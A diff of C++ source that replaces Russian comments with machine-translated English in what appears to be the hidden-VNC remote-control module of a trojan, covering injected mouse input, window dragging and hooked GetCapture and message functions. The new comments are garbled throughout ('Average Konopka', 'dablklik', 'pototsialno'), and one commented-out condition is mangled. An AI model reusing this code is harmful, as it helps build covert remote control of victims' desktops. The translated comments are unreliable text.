@@ -62,7 +62,7 @@ static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
   
   if(CWA(user32, GetWindowRect)(window, &rect) == FALSE)return;
   
-  //Создаем потоциально новый RECT.
+  //Create a new pototsialno RECT.
   if(area == HTCAPTION)
   {
     x -= vncProcessData->globalData->cursorPoint.x;
@@ -82,7 +82,7 @@ static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
     newRect.right  = rect.right  + (x - rect.right);
     newRect.bottom = rect.bottom + (y - rect.bottom);
 
-    //Выбираем изменяемый стороны.
+    //Choose a variable part.
     switch(area)
     {
       case HTLEFT:   rect.left   = newRect.left;   break;
@@ -99,7 +99,7 @@ static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
     }
   }
 
-  //Изменяем.
+  //Change.
   if(CWA(user32, IsRectEmpty)(&rect) == FALSE)
   {
     if(CWA(user32, GetWindowLongPtrW)(window, GWL_STYLE) & WS_CHILD)
@@ -131,7 +131,7 @@ static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DW
   DWORD doubleClickMessage = 0;
   bool nc;
   
-  //Выбираем сообщение довйного клика.
+  //Select the message dovynogo clique.
   switch(message)
   {
     case WM_LBUTTONDOWN:
@@ -165,12 +165,12 @@ static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DW
       break;
   }
   
-  //Если возможен даблклик.
+  //If possible dablklik.
   if(doubleClickMessage != 0)
   {
     DWORD timeOfMessage = CWA(kernel32, GetTickCount)();
 
-    //Тест на даблклик.
+    //Test for dablklik.
     if(vncProcessData->serverData.input.lastDownWindow == window && vncProcessData->serverData.input.lastDownMessage == message &&
         (timeOfMessage - vncProcessData->serverData.input.lastDownTime) <= MOUSE_DOUBLE_CLICK_DELAY &&
         (nc || CWA(user32, GetClassLongPtrW)(window, GCL_STYLE) & CS_DBLCLKS)
@@ -204,7 +204,7 @@ static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DW
 */
 static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOWINFO *windowInfo, WORD hitTest, DWORD message, DWORD ncMessage, LPARAM clientCursorPos, LPARAM screenCursorPos)
 {
-  //Активация окна.
+  //Activation of the window.
   if(message == WM_LBUTTONDOWN || message == WM_MBUTTONDOWN || message == WM_RBUTTONDOWN)
   {
     bool skip = false;
@@ -225,7 +225,7 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
       }
     }
 
-    if(skip == true)return; //Не нужно отправлять сообщение нажатия.
+    if(skip == true)return; //No need to send a message to pressing.
   }
   
   CWA(user32, PostMessageW)(window, WM_SETCURSOR, (WPARAM)window, MAKELPARAM(hitTest, message));
@@ -238,7 +238,7 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
   
   ncMessage = checkForDoubleClick(vncProcessData, window, ncMessage);
   
-  //Некотрые сообшения мы обрабатываем самостоятельно.    
+  //Nekotrye messages while we process on their own.
   WORD command = 0;
   switch(hitTest)
   {
@@ -266,7 +266,7 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
     case HTCLOSE:
       if(ncMessage == WM_NCLBUTTONUP)
       {
-        //FIXME: Проверка доступности кнопки.
+        //FIXME: Check Availability button.
         command = SC_CLOSE;
       }
       else if(ncMessage == WM_NCRBUTTONUP)command = 0xFFFF;
@@ -283,7 +283,7 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
       {
         if(ncMessage == WM_NCLBUTTONDOWN)
         {
-          //Небольшой хак для скрола.
+          //Small Hack to scroll.
           changeMouseCapture(vncProcessData, CWA(user32, GetWindowThreadProcessId)(window, NULL), window, HTNOWHERE, true);
         }
         goto postMessage;
@@ -318,8 +318,8 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
     case HTBOTTOM:
     case HTBOTTOMLEFT:
     case HTBOTTOMRIGHT:
-      //Начинаем перетаскивание.
-      if(ncMessage == WM_NCLBUTTONDOWN)// && (windowInfo->dwStyle & WS_CHILD) == 0)
+      //Begin to drag.
+      if(ncMessage == WM_NCLBUTTONDOWN)//B & & (WindowInfo-> dwStyle & WS_CHILD) == 0)
       {
         changeMouseCapture(vncProcessData, CWA(user32, GetWindowThreadProcessId)(window, NULL), window, hitTest, true);
       }
@@ -331,7 +331,7 @@ static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOW
       break;
   }
   
-  //Отправляем команду.
+  //Send command.
   if(command != 0)
   {
     if(command == 0xFFFF)CWA(user32, PostMessageW)(window, WM_CONTEXTMENU, (WPARAM)window, screenCursorPos); 
@@ -345,20 +345,20 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
   DWORD captureWindowTid = 0;
   WORD oldInputState;
 
-  //Проверяем процесс перетаскивания окна.
+  //Check the process of dragging the window.
   if(vncProcessData->globalData->mouseCapture.area != HTNOWHERE)
   {
-    //Перетаксивание.
+    //Peretaksivanie.
     if(flags & MOUSEEVENTF_MOVE)
     {
       moveCapturedWindow(vncProcessData, x, y);
       flags &= ~MOUSEEVENTF_MOVE;
     }
-    //Перетаскивание окончено.
+    //Drag and drop is completed.
     if(flags & MOUSEEVENTF_LEFTUP)
     {
       changeMouseCapture(vncProcessData, 0, NULL, HTNOWHERE, true);
-      //flags &= ~MOUSEEVENTF_LEFTUP;
+      //flags & = ~ MOUSEEVENTF_LEFTUP;
     }
   }
   else
@@ -371,10 +371,10 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
   vncProcessData->globalData->cursorPoint.x = x;
   vncProcessData->globalData->cursorPoint.y = y;
 
-  //Нечего обрабатывать.
+  //Needless to handle.
   if(flags == 0)return;
 
-  //Обновляем состояния кнопок мыши.
+  //Update the state of the mouse buttons.
   if(flags & MOUSEEVENTF_LEFTDOWN)updateInputState(vncProcessData, VK_LBUTTON, true);
   else if(flags & MOUSEEVENTF_LEFTUP)updateInputState(vncProcessData, VK_LBUTTON, false);
 
@@ -384,7 +384,7 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
   if(flags & MOUSEEVENTF_RIGHTDOWN)updateInputState(vncProcessData, VK_RBUTTON, true);
   else if(flags & MOUSEEVENTF_RIGHTUP)updateInputState(vncProcessData, VK_RBUTTON, false);
   
-  //Вычисляем окно.
+  //Compute window.
   DWORD hitTest;
   HWND window = Gui::_windowFromPoint(vncProcessData->globalData->cursorPoint, SENDMESSAGE_TIMEOUT, &hitTest);
   
@@ -402,7 +402,7 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
     }
   }
   
-  //Обработка захваченого окна.  
+  //Processing the captured window.
   if(window != NULL && getWindowClassFlags(window) & WCF_MOUSE_AUTOCAPTURE)
   {
     if(window != captureWindow)
@@ -418,15 +418,15 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
     if(
        CWA(user32, IsWindow)(captureWindow) &&
        (
-        window == NULL || captureWindow == window ||           //Если просиходит внутри окна.
-        oldInputState & (VK_LBUTTON | VK_MBUTTON | VK_RBUTTON) //Если с предыдшего раза нажа хотябы одна кнопка, направляем сообщения в captureWindow.
+        window == NULL || captureWindow == window ||           //If prosihodit inside the box.
+        oldInputState & (VK_LBUTTON | VK_MBUTTON | VK_RBUTTON) //If the predydshego At least twice by clicking one button, send messages to captureWindow.
        )
       )
     {
       window = captureWindow;
       hitTest = HTCLIENT;
     }
-    //Снимаем захват для всех отальных случиях (это отличается от правил MS!).
+    //Remove grip for all otalnyh case (this is different from the rules of MS!).
     else if(flags != (MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE))
     {
       changeMouseCapture(vncProcessData, 0, NULL, HTNOWHERE, true);
@@ -443,29 +443,29 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
       LPARAM screenCursorPos = MAKELPARAM(x, y);
       LPARAM clientCursorPos;
             
-      //Координаты нужны только для HTCLIENT.
+      //Coordinates are needed only for HTCLIENT.
       if(hitTest == HTCLIENT)
       {
         if(getWindowClassFlags(window) & WCF_MOUSE_CLIENT_TO_SCREEN)clientCursorPos = screenCursorPos;
         else clientCursorPos = MAKELPARAM(x - windowInfo.rcClient.left, y - windowInfo.rcClient.top);
       }
 
-      //Левая кнопка.
+      //The left button.
       if(flags & MOUSEEVENTF_LEFTDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_LBUTTONDOWN, WM_NCLBUTTONDOWN, clientCursorPos, screenCursorPos);
       else if(flags & MOUSEEVENTF_LEFTUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_LBUTTONUP, WM_NCLBUTTONUP, clientCursorPos, screenCursorPos);
 
-      //Средняя конопка.
+      //Average Konopka.
       if(flags & MOUSEEVENTF_MIDDLEDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MBUTTONDOWN, WM_NCMBUTTONDOWN, clientCursorPos, screenCursorPos);
       else if(flags & MOUSEEVENTF_MIDDLEUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MBUTTONUP, WM_NCMBUTTONUP, clientCursorPos, screenCursorPos);
 
-      //Правая кнопка.
+      //The right button.
       if(flags & MOUSEEVENTF_RIGHTDOWN)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_RBUTTONDOWN, WM_NCRBUTTONDOWN, clientCursorPos, screenCursorPos);
       else if(flags & MOUSEEVENTF_RIGHTUP)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_RBUTTONUP, WM_NCRBUTTONUP, clientCursorPos, screenCursorPos);
 
-      //Перемешение.
+      //Displaced.
       if(flags & MOUSEEVENTF_MOVE)mouseEvent(vncProcessData, window, &windowInfo, hitTest, WM_MOUSEMOVE, WM_NCMOUSEMOVE, clientCursorPos, screenCursorPos);
 
-      //Прокрутка.
+      //Scrolling.
       if(flags & MOUSEEVENTF_WHEEL)
       {
         WORD state = updateInputState(vncProcessData, 0, false);
@@ -565,13 +565,10 @@ HWND WINAPI VncServer::hookerGetCapture(void)
   return CWA(user32, GetCapture)();
 }
 
-/*
-  Модификация MSG структуры.
+/*В В Modification of the MSG structure.
 
-  IN r       - возращаемое значение от функции, получившей структуру msg.
-  IN OUT msg - MSG
-
-*/
+В В IN r - returns a value from a function to obtain a structure msg.
+В В IN OUT msg - MSG*/
 static void fixMessage(BOOL r, LPMSG msg)
 {
   if(r != 0 && r != -1 && msg != NULL && IS_VNC_PROCESS)
